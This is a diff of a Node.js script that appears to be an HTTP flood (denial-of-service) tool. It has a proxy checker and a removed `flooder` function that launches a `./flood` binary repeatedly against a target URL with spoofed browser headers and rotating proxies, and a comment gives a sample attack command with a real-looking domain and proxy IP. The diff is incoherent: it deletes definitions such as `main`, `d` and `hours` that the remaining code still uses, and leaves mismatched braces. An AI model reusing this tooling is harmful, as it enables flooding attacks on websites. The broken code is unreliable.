@@ -10,16 +10,8 @@ const { spawn } = require('child_process');
 
 const fs = require('fs');
 const colors = require('colors');
-var path = require("path");
 const request = require("request");
 const validProxies = [];
-
-const urlT = process.argv[2];
-const timeT = process.argv[3];
-const ratee = process.argv[4]
-
-const Ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/105.0'
-const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
 
 
 function randPrx() {
@@ -27,8 +19,6 @@ function randPrx() {
 }
 
 function log(string) {
-	let d = new Date();
-	let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
 	let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
 	let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
 	console.log(`(${hours}:${minutes}:${seconds}) ${string}`);
@@ -38,8 +28,6 @@ function check_proxy(proxy) {
 	request({
 		url: "https://www.google.com/",
 		proxy: "http://" + proxy,
-		headers: {
-			'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0",
 		}
 	}, (err, res, body) => {
 		if (!err) {
@@ -47,18 +35,6 @@ function check_proxy(proxy) {
 			log('['.red + 'Onion'.white + 'suck'.red + '] '.white + ` Added new proxy: `.red + ` ${proxy}`.white);
 		}
 	});
-}
-
-function flooder(cookie, e) {
-
-	for (let i = 0; i < 10; i++) {
-		//./flood https://dststx.xyz "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0" 300 "coco" GET 3000 213.238.182.19:3128
-		const sus = spawn('./flood', [urlT, "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0", timeT, cookie, "GET", ratee, e])
-	
-		sus.stdout.on('data', (data) => {
-            // console.log(`${data}`);
-        });
-	}
 }
 
 async function sessionIn() {
@@ -75,12 +51,7 @@ async function sessionIn() {
 	})
 }
 
-function main() {
-	proxies.forEach((e) => {
-		check_proxy(e);
-	})
-
-	setTimeout(() => {
+setTimeout(() => {
 		return sessionIn();
 	}, 15 * 1000);
 }
@@ -88,7 +59,6 @@ function main() {
 main();
 
 setTimeout(() => {
-    process.exit(0);
     process.exit(0);
     process.exit(0);
 }, timeT * 1000)
